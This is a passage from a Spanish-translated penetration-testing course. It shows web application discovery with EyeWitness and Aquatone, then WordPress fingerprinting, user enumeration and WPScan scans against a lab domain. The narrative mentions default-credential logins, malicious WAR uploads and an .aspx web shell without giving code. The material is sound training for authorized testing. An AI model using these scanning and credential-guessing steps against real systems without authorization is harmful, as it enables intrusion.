  -x Filename.xml       Nmap XML or .Nessus file
  --single Single URL   Single URL/Host to capture
  --no-dns              Skip DNS resolution when connecting to websites

Timing Options:
  --timeout Timeout     Maximum number of seconds to wait while requesting a
                        web page (Default: 7)
  --jitter # of Seconds
                        Randomize URLs and add a random delay between requests
  --delay # of Seconds  Delay between the opening of the navigator and taking
                        the screenshot
  --threads # of Threads
                        Number of threads to use while using file based input
  --max-retries Max retries on a timeout
                        Max retries on timeouts

<SNIP>
```

Ejecutemos el valor predeterminado `--web` opción para tomar capturas de pantalla utilizando la salida Nmap XML del escaneo de descubrimiento como entrada.

  Descubrimiento y Enumeración de Aplicaciones

```shell-session
vcrdcr@htb[/htb]$ eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness

################################################################################
#                                  EyeWitness                                  #
################################################################################
#           FortyNorth Security - https://www.fortynorthsecurity.com           #
################################################################################

Starting Web Requests (26 Hosts)
Attempting to screenshot http://app.inlanefreight.local
Attempting to screenshot http://app-dev.inlanefreight.local
Attempting to screenshot http://app-dev.inlanefreight.local:8000
Attempting to screenshot http://app-dev.inlanefreight.local:8080
Attempting to screenshot http://gitlab-dev.inlanefreight.local
Attempting to screenshot http://10.129.201.50
Attempting to screenshot http://10.129.201.50:8000
Attempting to screenshot http://10.129.201.50:8080
Attempting to screenshot http://dev.inlanefreight.local
Attempting to screenshot http://jenkins-dev.inlanefreight.local
Attempting to screenshot http://jenkins-dev.inlanefreight.local:8000
Attempting to screenshot http://jenkins-dev.inlanefreight.local:8080
Attempting to screenshot http://support-dev.inlanefreight.local
Attempting to screenshot http://drupal-dev.inlanefreight.local
[*] Hit timeout limit when connecting to http://10.129.201.50:8000, retrying
Attempting to screenshot http://jenkins.inlanefreight.local
Attempting to screenshot http://jenkins.inlanefreight.local:8000
Attempting to screenshot http://jenkins.inlanefreight.local:8080
Attempting to screenshot http://support.inlanefreight.local
[*] Completed 15 out of 26 services
Attempting to screenshot http://drupal-qa.inlanefreight.local
Attempting to screenshot http://web01.inlanefreight.local
Attempting to screenshot http://web01.inlanefreight.local:8000
Attempting to screenshot http://web01.inlanefreight.local:8080
Attempting to screenshot http://inlanefreight.local
Attempting to screenshot http://drupal-acc.inlanefreight.local
Attempting to screenshot http://drupal.inlanefreight.local
Attempting to screenshot http://blog-dev.inlanefreight.local
Finished in 57.859838008880615 seconds

[*] Done! Report written in the /home/mrb3n/Projects/inlanfreight/inlanefreight_eyewitness folder!
Would you like to open the report now? [Y/n]
```

---

## Usando Aquatone

[Aquatone](https://github.com/michenriksen/aquatone), como se mencionó anteriormente, es similar a EyeWitness y puede tomar capturas de pantalla cuando se proporciona un `.txt` archivo de hosts o un Nmap `.xml` archivo con el `-nmap` bandera. Podemos compilar Aquatone por nuestra cuenta o descargar un binario precompilado. Después de descargar el binario, solo necesitamos extraerlo, y estamos listos para comenzar.

Nota: `Aquatone` actualmente se encuentra en desarrollo activo en un nuevo [tenedor](https://github.com/shelld3v/aquatone), centrándose en mejoras y mejoras de características. Consulte la guía de instalación proporcionada en el repositorio.

  Descubrimiento y Enumeración de Aplicaciones

```shell-session
vcrdcr@htb[/htb]$ wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
```

  Descubrimiento y Enumeración de Aplicaciones

```shell-session
vcrdcr@htb[/htb]$ unzip aquatone_linux_amd64_1.7.0.zip 

Archive:  aquatone_linux_amd64_1.7.0.zip
  inflating: aquatone                
  inflating: README.md               
  inflating: LICENSE.txt 
```

Podemos moverlo a una ubicación en nuestro `$PATH` como `/usr/local/bin` para poder llamar a la herramienta desde cualquier lugar o simplemente soltar el binario en nuestro directorio de trabajo (digamos, escaneos). Es una preferencia personal, pero generalmente es más eficiente construir nuestras VM de ataque con la mayoría de las herramientas disponibles para usar sin tener que cambiar constantemente los directorios o llamarlos desde otros directorios.

  Descubrimiento y Enumeración de Aplicaciones

```shell-session
vcrdcr@htb[/htb]$ echo $PATH

/home/mrb3n/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

En este ejemplo, proporcionamos la misma herramienta `web_discovery.xml` Salida de mapa que especifica el `-nmap` bandera, y nos vamos a las carreras.

  Descubrimiento y Enumeración de Aplicaciones

```shell-session
vcrdcr@htb[/htb]$ cat web_discovery.xml | ./aquatone -nmap

aquatone v1.7.0 started at 2021-09-07T22:31:03-04:00

Targets    : 65
Threads    : 6
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

http://web01.inlanefreight.local:8000/: 403 Forbidden
http://app.inlanefreight.local/: 200 OK
http://jenkins.inlanefreight.local/: 403 Forbidden
http://app-dev.inlanefreight.local/: 200 
http://app-dev.inlanefreight.local/: 200 
http://app-dev.inlanefreight.local:8000/: 403 Forbidden
http://jenkins.inlanefreight.local:8000/: 403 Forbidden
http://web01.inlanefreight.local:8080/: 200 
http://app-dev.inlanefreight.local:8000/: 403 Forbidden
http://10.129.201.50:8000/: 200 OK

<SNIP>

http://web01.inlanefreight.local:8000/: screenshot successful
http://app.inlanefreight.local/: screenshot successful
http://app-dev.inlanefreight.local/: screenshot successful
http://jenkins.inlanefreight.local/: screenshot successful
http://app-dev.inlanefreight.local/: screenshot successful
http://app-dev.inlanefreight.local:8000/: screenshot successful
http://jenkins.inlanefreight.local:8000/: screenshot successful
http://app-dev.inlanefreight.local:8000/: screenshot successful
http://app-dev.inlanefreight.local:8080/: screenshot successful
http://app.inlanefreight.local/: screenshot successful

<SNIP>

Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done

Writing session file...Time:
 - Started at  : 2021-09-07T22:31:03-04:00
 - Finished at : 2021-09-07T22:31:36-04:00
 - Duration    : 33s

Requests:
 - Successful : 65
 - Failed     : 0

 - 2xx : 47
 - 3xx : 0
 - 4xx : 18
 - 5xx : 0

Screenshots:
 - Successful : 65
 - Failed     : 0

Wrote HTML report to: aquatone_report.html
```

---

## Interpretando los Resultados

Incluso con los 26 hosts anteriores, este informe nos ahorrará tiempo. ¡Ahora imagine un entorno con 500 o 5,000 anfitriones! Después de abrir el informe, vemos que el informe está organizado en categorías, con `High Value Targets` ser el primero y típicamente el anfitrión más "jugoso" para ir después. He dirigido EyeWitness en entornos muy grandes y he generado informes con cientos de páginas que tardan horas en pasar. A menudo, los informes muy grandes tendrán anfitriones interesantes enterrados en lo profundo de ellos, por lo que vale la pena revisar todo el asunto e investigar/investigar cualquier aplicación con la que no estemos familiarizados. Encontré el `ManageEngine OpManager` aplicación mencionada en la sección de introducción enterrada profundamente en un informe muy grande durante una prueba de penetración externa. Esta instancia se dejó configurada con las credenciales predeterminadas `admin:admin`y se dejó abierto a Internet. Pude iniciar sesión y lograr la ejecución de código ejecutando un script de PowerShell. La aplicación OpManager se estaba ejecutando en el contexto de una cuenta de Domain Admin que condujo a un compromiso total de la red interna.

En el siguiente informe, estaría inmediatamente emocionado de ver a Tomcat en cualquier evaluación (pero especialmente durante una Prueba de Penetración Externa) e intentaría credenciales predeterminadas en el `/manager` y `/host-manager` puntos finales. Si podemos acceder a cualquiera de los dos, podemos cargar un archivo WAR malicioso y lograr la ejecución remota de código en el host subyacente utilizando [Código JSP](https://en.wikipedia.org/wiki/Jakarta_Server_Pages). Más sobre esto más adelante en el módulo.

![imagen](https://academy.hackthebox.com/storage/modules/113/eyewitness4.png)

Continuando con el informe, parece el principal `http://inlanefreight.local` el sitio web es el siguiente. Siempre vale la pena probar las aplicaciones web personalizadas, ya que pueden contener una amplia variedad de vulnerabilidades. Aquí también me interesaría ver si el sitio web estaba ejecutando un CMS popular como WordPress, Joomla o Drupal. La siguiente aplicación, `http://support-dev.inlanefreight.local`, es interesante porque parece estar funcionando [osTicket](https://osticket.com/), que ha sufrido varias vulnerabilidades graves a lo largo de los años. Los sistemas de ticketing de soporte son de particular interés porque podemos iniciar sesión y obtener acceso a información confidencial. Si la ingeniería social está en alcance, es posible que podamos interactuar con el personal de atención al cliente o incluso manipular el sistema para registrar una dirección de correo electrónico válida para el dominio de la empresa que podemos aprovechar para obtener acceso a otros servicios.

Esta última pieza se demostró en el cuadro de liberación semanal HTB [Entrega](https://0xdf.gitlab.io/2021/05/22/htb-delivery.html) por [IppSec](https://www.youtube.com/watch?v=gbs43E71mFM). Vale la pena estudiar esta caja en particular, ya que muestra lo que es posible explorando la funcionalidad incorporada de ciertas aplicaciones comunes. Cubriremos osTicket más en profundidad más adelante en este módulo.

![imagen](https://academy.hackthebox.com/storage/modules/113/eyewitness3.png)

Durante una evaluación, continuaría revisando el informe, anotando hosts interesantes, incluida la URL y el nombre/versión de la aplicación para más adelante. Es importante en este punto recordar que todavía estamos en la fase de recopilación de información, y cada pequeño detalle podría hacer o deshacer nuestra evaluación. No debemos descuidarnos y comenzar a atacar a los anfitriones de inmediato, ya que podemos terminar en una madriguera de conejo y perder algo crucial más adelante en el informe. Durante una Prueba de Penetración Externa, esperaría ver una combinación de aplicaciones personalizadas, algunos CMS, quizás aplicaciones como Tomcat, Jenkins y Splunk, portales de acceso remoto como Servicios de Escritorio Remoto (RDS), puntos finales SSL VPN, Outlook Web Access (OWA), O365, tal vez algún tipo de página de inicio de sesión de dispositivo de red de borde, etc.

Su kilometraje puede variar y, a veces, nos encontraremos con aplicaciones que absolutamente no deberían estar expuestas, como una sola página con un botón de carga de archivos que encontré una vez con un mensaje que decía "Solo cargue archivos .zip y .tar.gz". Yo, por supuesto, no presté atención a esta advertencia (ya que esto estaba en el alcance durante una prueba de penetración sancionada por el cliente) y procedí a cargar una prueba `.aspx` archivo. Para mi sorpresa, no hubo ningún tipo de validación del lado del cliente o del back-end, y el archivo pareció cargarse. Haciendo un directorio rápido de fuerza bruta, pude localizar un `/files` directorio que tenía lista de directorios habilitado, y mi `test.aspx` el archivo estaba allí. Desde aquí, procedí a subir un `.aspx`shell web y se afianzó en el entorno interno. Este ejemplo muestra que no debemos dejar piedra sin remover y que puede haber un tesoro absoluto de datos para nosotros en nuestros datos de descubrimiento de aplicaciones.

Durante una Prueba de Penetración Interna, veremos gran parte de lo mismo, pero a menudo también veremos muchas páginas de inicio de sesión de impresora (que a veces podemos aprovechar para obtener credenciales LDAP en texto claro), portales de inicio de sesión ESXi y vCenter, páginas de inicio de sesión iLO e iDRAC, una gran cantidad de dispositivos de red, dispositivos IoT, teléfonos IP, repositorios de código interno, portales de intranet personalizados y SharePoint, dispositivos de seguridad y mucho más.

---

## Avanzando

Ahora que hemos trabajado a través de nuestra metodología de descubrimiento de aplicaciones y hemos configurado nuestra estructura de toma de notas, profundicemos en algunas de las aplicaciones más comunes que encontraremos una y otra vez. Tenga en cuenta que este módulo no puede cubrir todas las aplicaciones que enfrentaremos. Más bien, nuestro objetivo es cubrir las muy frecuentes y aprender sobre vulnerabilidades comunes, configuraciones erróneas y abusar de su funcionalidad incorporada.

Puedo garantizar que enfrentará al menos algunas, si no todas, de estas aplicaciones durante su carrera como probador de penetración. La metodología y la mentalidad de explorar estas aplicaciones son aún más importantes, que desarrollaremos y mejoraremos a lo largo de este módulo y probaremos durante las evaluaciones de habilidades al final. Muchos evaluadores tienen grandes habilidades técnicas, pero las habilidades blandas, como una metodología sólida y repetible junto con la organización, la atención al detalle, la comunicación sólida y la toma de notas/documentación e informes exhaustivos, pueden diferenciarnos y ayudar a generar confianza en nuestras habilidades tanto de nuestros empleadores como de nuestros clientes.


# WordPress - Descubrimiento y enumeración

---

[WordPress](https://wordpress.org/), lanzado en 2003, es un Sistema de Gestión de Contenido (CMS) de código abierto que se puede utilizar para múltiples propósitos. A menudo se usa para alojar blogs y foros. WordPress es altamente personalizable y amigable con SEO, lo que lo hace popular entre las empresas. Sin embargo, su personalización y naturaleza extensible lo hacen propenso a vulnerabilidades a través de temas y complementos de terceros. WordPress está escrito en PHP y generalmente se ejecuta en Apache con MySQL como backend.

Al momento de escribir este artículo, WordPress representa alrededor del 32.5% de todos los sitios en Internet y es el CMS más popular por cuota de mercado. Aquí hay algunos interesantes [hechos](https://hostingtribunal.com/blog/wordpress-statistics/) sobre WordPress.

- WordPress ofrece más de 50.000 plugins y más de 4.100 temas con licencia GPL
- Se han lanzado 317 versiones separadas de WordPress desde su lanzamiento inicial
- Aproximadamente 661 nuevos sitios web de WordPress se construyen todos los días
- Los blogs de WordPress están escritos en más de 120 idiomas
- Un estudio mostró que aproximadamente el 8% de los hacks de WordPress ocurren debido a contraseñas débiles, mientras que el 60% se debió a una versión obsoleta de WordPress
- Según WPScan, de casi 4.000 vulnerabilidades conocidas, el 54% son de plugins, el 31,5% son del núcleo de WordPress y el 14,5% son de temas de WordPress.
- Algunas marcas importantes que usan WordPress incluyen The New York Times, eBay, Sony, Forbes, Disney, Facebook, Mercedes-Benz y muchas más

Como podemos ver en estas estadísticas, WordPress es extremadamente frecuente en Internet y presenta una vasta superficie de ataque. Tenemos la garantía de encontrar WordPress durante muchas de nuestras evaluaciones de Pruebas de Penetración Externa, y debemos entender cómo funciona, cómo enumerarlo y las diversas formas en que puede ser atacado.

El [Hacking WordPress](https://academy.hackthebox.com/course/preview/hacking-wordpress) el módulo en HTB Academy profundiza mucho en la estructura y función de WordPress y en las formas en que se puede abusar de él.

Imaginemos que durante una prueba de penetración externa, nos encontramos con una empresa que aloja su sitio web principal basado en WordPress. Al igual que muchas otras aplicaciones, WordPress tiene archivos individuales que nos permiten identificar esa aplicación. Además, los archivos, la estructura de carpetas, los nombres de archivos y la funcionalidad de cada script PHP se pueden usar para descubrir incluso la versión instalada de WordPress. En esta aplicación web, por defecto, los metadatos se añaden por defecto en el código fuente HTML de la página web, que a veces incluso ya contiene la versión. Por lo tanto, veamos qué posibilidades tenemos para encontrar información más detallada sobre WordPress.

---

## Descubrimiento/Footprinting

Una forma rápida de identificar un sitio de WordPress es navegando al `/robots.txt` archivo. Un robots.txt típico en una instalación de WordPress puede verse como:

  WordPress - Descubrimiento y enumeración

```shell-session
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```

Aquí la presencia de la `/wp-admin` y `/wp-content` los directorios serían un regalo muerto que estamos tratando con WordPress. Típicamente intentando navegar hacia el `wp-admin` el directorio nos redirigirá al `wp-login.php` página. Este es el portal de inicio de sesión para el back-end de la instancia de WordPress.

   

![](https://academy.hackthebox.com/storage/modules/113/wp-login2.png)

WordPress almacena sus plugins en el `wp-content/plugins` directorio. Esta carpeta es útil para enumerar plugins vulnerables. Los temas se almacenan en el `wp-content/themes` directorio. Estos archivos deben enumerarse cuidadosamente, ya que pueden conducir a RCE.

Hay cinco tipos de usuarios en una instalación estándar de WordPress.

1. Administrador: Este usuario tiene acceso a funciones administrativas dentro del sitio web. Esto incluye agregar y eliminar usuarios y publicaciones, así como editar código fuente.
2. Editor: Un editor puede publicar y administrar publicaciones, incluidas las publicaciones de otros usuarios.
3. Autor: Pueden publicar y administrar sus propias publicaciones.
4. Colaborador: Estos usuarios pueden escribir y administrar sus propias publicaciones pero no pueden publicarlas.
5. Suscriptor: Estos son usuarios estándar que pueden navegar por las publicaciones y editar sus perfiles.

Obtener acceso a un administrador suele ser suficiente para obtener la ejecución de código en el servidor. Los editores y autores pueden tener acceso a ciertos complementos vulnerables, que los usuarios normales no tienen.

---

## Enumeración

Otra forma rápida de identificar un sitio de WordPress es mirando la fuente de la página. Ver la página con `cURL` y grepping para `WordPress` puede ayudarnos a confirmar que WordPress está en uso y a eliminar el número de versión, que debemos anotar para más adelante. Podemos enumerar WordPress usando una variedad de tácticas manuales y automatizadas.

  WordPress - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep WordPress

<meta name="generator" content="WordPress 5.8" /
```

Navegar por el sitio y examinar la fuente de la página nos dará pistas sobre el tema en uso, los complementos instalados e incluso los nombres de usuario si los nombres de los autores se publican con publicaciones. Deberíamos pasar algún tiempo navegando manualmente por el sitio y mirando la fuente de la página para cada página, buscando el `wp-content` directorio, `themes` y `plugin`y comience a construir una lista de puntos de datos interesantes.

Mirando la fuente de la página, podemos ver que el [Gravedad Empresarial](https://wordpress.org/themes/business-gravity/) el tema está en uso. Podemos ir más allá e intentar tomar las huellas dactilares del número de versión del tema y buscar cualquier vulnerabilidad conocida que lo afecte.

  WordPress - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep themes

<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' />
```

A continuación, echemos un vistazo a qué complementos podemos descubrir.

  WordPress - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep plugins

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8' id='validation-engine-en-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8' id='validation-engine-js'></script>
		<link rel='stylesheet' id='mm_frontend-css'  href='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script>
```

De la salida anterior, sabemos que el [Formulario de Contacto 7](https://wordpress.org/plugins/contact-form-7/) y [mail-masta](https://wordpress.org/plugins/mail-masta/) los plugins están instalados. El siguiente paso sería enumerar las versiones.

Navegando a `http://blog.inlanefreight.local/wp-content/plugins/mail-masta/` nos muestra que la lista de directorios está habilitada y que a `readme.txt` el archivo está presente. Estos archivos son muy a menudo útiles en la toma de huellas digitales de los números de versión. De la readme, parece que la versión 1.0.0 del plugin está instalado, que sufre de un [Inclusión Local de Archivos](https://www.exploit-db.com/exploits/50226) vulnerabilidad que se publicó en agosto de 2021.

Vamos a cavar un poco más. Comprobando la fuente de la página de otra página, podemos ver que el [wpDiscuz](https://wpdiscuz.com/) plugin está instalado, y parece ser la versión 7.0.4

  WordPress - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ curl -s http://blog.inlanefreight.local/?p=1 | grep plugins

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpdiscuz-frontend-css-css'  href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4' type='text/css' media='all' />
```

Una búsqueda rápida de esta versión del plugin muestra [esto](https://www.exploit-db.com/exploits/49967) vulnerabilidad de ejecución remota de código no autenticada a partir de junio de 2021. Notaremos esto y seguiremos adelante. Es importante en esta etapa no adelantarnos y comenzar a explotar la primera falla posible que vemos, ya que hay muchas otras vulnerabilidades potenciales y configuraciones erróneas posibles en WordPress que no queremos perdernos.

---

## Enumerando Usuarios

También podemos hacer una enumeración manual de los usuarios. Como se mencionó anteriormente, la página de inicio de sesión predeterminada de WordPress se puede encontrar en `/wp-login.php`.

Un nombre de usuario válido y una contraseña no válida dan como resultado el siguiente mensaje:

   

![](https://academy.hackthebox.com/storage/modules/113/valid_user.png)

Sin embargo, un nombre de usuario no válido devuelve que no se encontró al usuario.

   

![](https://academy.hackthebox.com/storage/modules/113/invalid_user.png)

Esto hace que WordPress sea vulnerable a la enumeración de nombres de usuario, que se puede utilizar para obtener una lista de nombres de usuario potenciales.

Recapitulemos. En esta etapa, hemos recopilado los siguientes puntos de datos:

- El sitio parece estar ejecutando la versión principal de WordPress 5.8
- El tema instalado es Business Gravity
- Los siguientes plugins están en uso: Formulario de contacto 7, mail-masta, wpDiscuz
- La versión wpDiscuz parece ser 7.0.4, que sufre de una vulnerabilidad de ejecución remota de código no autenticada
- La versión mail-masta parece ser 1.0.0, que sufre de una vulnerabilidad de Inclusión de Archivos Locales
- El sitio de WordPress es vulnerable a la enumeración de usuarios y al usuario `admin` se confirma que es un usuario válido

Llevemos las cosas un paso más allá y validemos/agreguemos algunos de nuestros puntos de datos con algunos escaneos de enumeración automatizados del sitio de WordPress. Una vez que completemos esto, deberíamos tener suficiente información a mano para comenzar a planificar y montar nuestros ataques.

---

## WPScan

[WPScan](https://github.com/wpscanteam/wpscan) es un escáner automatizado de WordPress y una herramienta de enumeración. Determina si los diversos temas y complementos utilizados por un blog están desactualizados o son vulnerables. Se instala de forma predeterminada en Parrot OS, pero también se puede instalar manualmente con `gem`.

  WordPress - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ sudo gem install wpscan
```

WPScan también puede extraer información de vulnerabilidad de fuentes externas. Podemos obtener un token API de [WPVulnDB](https://wpvulndb.com/), que es utilizado por WPScan para escanear PoC e informes. El plan gratuito permite hasta 75 solicitudes por día. Para usar la base de datos WPVulnDB, simplemente cree una cuenta y copie el token API de la página de usuarios. Este token se puede suministrar a wpscan utilizando el `--api-token parameter`.

Escribir `wpscan -h` mostrará el menú de ayuda.

  WordPress - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ wpscan -h

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

Usage: wpscan [options]
        --url URL                                 The URL of the blog to scan
                                                  Allowed Protocols: http, https
                                                  Default Protocol if none provided: http
                                                  This option is mandatory unless update or help or hh or version is/are supplied
    -h, --help                                    Display the simple help and exit
        --hh                                      Display the full help and exit
        --version                                 Display the version and exit
    -v, --verbose                                 Verbose mode
        --[no-]banner                             Whether or not to display the banner
                                                  Default: true
    -o, --output FILE                             Output to FILE
    -f, --format FORMAT                           Output results in the format supplied
                                                  Available choices: json, cli-no-colour, cli-no-color, cli
        --detection-mode MODE                     Default: mixed
                                                  Available choices: mixed, passive, aggressive

<SNIP>
```

El `--enumerate` flag se utiliza para enumerar varios componentes de la aplicación WordPress, como complementos, temas y usuarios. De forma predeterminada, WPScan enumera complementos, temas, usuarios, medios y copias de seguridad vulnerables. Sin embargo, pueden suministrarse argumentos específicos para restringir la enumeración a componentes específicos. Por ejemplo, todos los complementos se pueden enumerar utilizando los argumentos `--enumerate ap`. Invocaremos un escaneo de enumeración normal contra un sitio web de WordPress con el `--enumerate` marcar y pasar un token API de WPVulnDB con el `--api-token` bandera.

  WordPress - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>

<SNIP>

[+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
[+] Started: Thu Sep 16 23:11:43 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://blog.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.8</generator>
 |  - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.8</generator>
 |
 | [!] 3 vulnerabilities identified:
 |
 | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API
 |     Fixed in: 5.8.1
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/38dd7e87-9a22-48e2-bab1-dc79448ecdfb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5
 |
 | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor
 |     Fixed in: 5.8.1
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/5b754676-20f5-4478-8fd3-6bc383145811
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v
 |
 | [!] Title: WordPress 5.4 to 5.8 -  Lodash Library Update
 |     Fixed in: 5.8.1
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/5d6789db-e320-494b-81bb-e678674f4199
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/lodash/lodash/wiki/Changelog
 |      - https://github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689

[+] WordPress theme in use: transport-gravity
 | Location: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/
 | Latest Version: 1.0.1 (up to date)
 | Last Updated: 2020-08-02T00:00:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css
 | Style Name: Transport Gravity
 | Style URI: https://keonthemes.com/downloads/transport-gravity/
 | Description: Transport Gravity is an enhanced child theme of Business Gravity. Transport Gravity is made for tran...
 | Author: Keon Themes
 | Author URI: https://keonthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css, Match: 'Version: 1.0.1'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://blog.inlanefreight.local/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI)

<SNIP>

| [!] Title: Mail Masta 1.0 - Multiple SQL Injection
      
 <SNIP
 
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

<SNIP>

[i] User(s) Identified:

[+] by:
									admin
 | Found By: Author Posts - Display Name (Passive Detection)

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

WPScan utiliza varios métodos pasivos y activos para determinar versiones y vulnerabilidades, como se muestra en el informe anterior. El número predeterminado de hilos utilizados es `5`. Sin embargo, este valor se puede cambiar usando el `-t` bandera.

Este escaneo nos ayudó a confirmar algunas de las cosas que descubrimos de la enumeración manual (WordPress versión principal 5.8 y listado de directorios habilitado), nos mostró que el tema que identificamos no era exactamente correcto (Transport Gravity está en uso, que es un tema secundario de Business Gravity), descubrió otro nombre de usuario (john) y demostró que la enumeración automatizada por sí sola a menudo no es suficiente (perdió los complementos wpDiscuz y Contact Form 7). WPScan proporciona información sobre vulnerabilidades conocidas. La salida del informe también contiene URL a PoC, lo que nos permitiría explotar estas vulnerabilidades.

El enfoque que tomamos en esta sección, combinando la enumeración manual y automatizada, se puede aplicar a casi cualquier aplicación que descubramos. Los escáneres son geniales y son muy útiles, pero no pueden reemplazar el toque humano y una mente curiosa. Honrar nuestras habilidades de enumeración puede diferenciarnos de la multitud como excelentes probadores de penetración.

---

## Avanzando

